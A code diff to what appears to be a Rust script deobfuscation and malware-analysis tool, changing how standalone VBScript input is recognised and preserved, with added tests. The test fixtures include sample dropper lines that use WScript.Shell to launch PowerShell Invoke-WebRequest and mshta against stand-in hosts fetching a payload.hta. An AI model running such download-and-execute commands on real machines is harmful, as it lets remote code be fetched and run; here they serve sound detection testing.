@@ -893,6 +893,22 @@ sh.Run cmd, 0, False
     }
 
     #[test]
+    fn standalone_script_prescan_ignores_direct_js_with_wscript() {
+        let mut env = Environment::new(&AnalyzeConfig::default());
+        crate::pre_scan_standalone_script_input(
+            br#"var sh = new ActiveXObject("WScript.Shell")
+sh.Run("powershell -Command Invoke-WebRequest https://direct-js.example/p")"#,
+            &mut env,
+        );
+        assert!(
+            env.all_extracted_jscript.is_empty() && env.all_extracted_vbs.is_empty(),
+            "direct JScript was queued as standalone VBS: js={} vbs={}",
+            env.all_extracted_jscript.len(),
+            env.all_extracted_vbs.len()
+        );
+    }
+
+    #[test]
     fn start_quoted_url_is_extracted() {
         // `start "" "URL"` opens the URL in the default handler.
         let script = b"start \"\" \"https://opened.example/doc.pdf\"\r\n";
@@ -2897,19 +2913,15 @@ fn first_meaningful_script_line(lower: &str) -> &str {
         .unwrap_or("")
 }
 
-fn starts_like_standalone_script(lower: &str) -> bool {
+fn starts_like_standalone_vbs(lower: &str) -> bool {
     let first = first_meaningful_script_line(lower);
     first.starts_with("dim ")
-        || first.starts_with("set ")
+        || (first.starts_with("set ") && first.contains("createobject"))
         || first.starts_with("option explicit")
         || first.starts_with("private function")
-        || first.starts_with("function ")
-        || first.starts_with("var ")
-        || first.starts_with("const ")
-        || first.starts_with("let ")
 }
 
-fn pre_scan_standalone_script_input(input: &[u8], env: &mut Environment) {
+fn pre_scan_standalone_script_input(input: &[u8], env: &mut Environment) -> bool {
     let has_vbs_atom = [
         b"createobject" as &[u8],
         b"wscript",
@@ -2919,17 +2931,19 @@ fn pre_scan_standalone_script_input(input: &[u8], env: &mut Environment) {
     .iter()
     .any(|needle| contains_ascii_case_insensitive_bytes(input, needle));
     if !has_vbs_atom {
-        return;
+        return false;
     }
 
     let text = String::from_utf8_lossy(input);
     let lower = text.to_ascii_lowercase();
-    if !starts_like_standalone_script(&lower) {
-        return;
+    if !starts_like_standalone_vbs(&lower) {
+        return false;
     }
     if has_vbs_atom && looks_like_vbs_script(&lower) {
         push_unique_payload(&mut env.all_extracted_vbs, text.as_bytes().to_vec());
+        return true;
     }
+    false
 }
 
 fn pre_scan_utf16_script_blob(decoded: &str, env: &mut Environment) {
@@ -3135,12 +3149,14 @@ fn analyze_inner(input: &[u8], cfg: &Config, file_path: Option<std::path::PathBu
             env.delayed_expansion = true;
         }
         pre_scan_polyglot_script_block(input, &mut env);
-        pre_scan_standalone_script_input(input, &mut env);
+        let standalone_script_input = pre_scan_standalone_script_input(input, &mut env);
         deob_scan::scan_raw_marker_powershell_urls(input, &mut env);
         profile_mark!("setup_and_prescan");
         if let Some(decoded) = decode_utf16le_script_blob(input) {
             pre_scan_utf16_script_blob(&decoded, &mut env);
             out = decoded;
+        } else if standalone_script_input {
+            out = String::from_utf8_lossy(input).into_owned();
         } else {
             drive(input, &mut env, &mut out);
         }
@@ -14153,6 +14169,13 @@ sh.Run cmd, 0, False"#;
             has,
             "no Download trait from standalone VBS WScript.Shell.Run Chr concat URL: {:?}",
             report.traits
+        );
+        assert!(
+            report.deobfuscated.contains(
+                r#"cmd = "mshta " & Chr(104) & "ttp://standalone-vbs-run.example/payload.hta""#
+            ),
+            "standalone VBS source was not preserved in deobfuscated output: {:?}",
+            report.deobfuscated
         );
     }
 
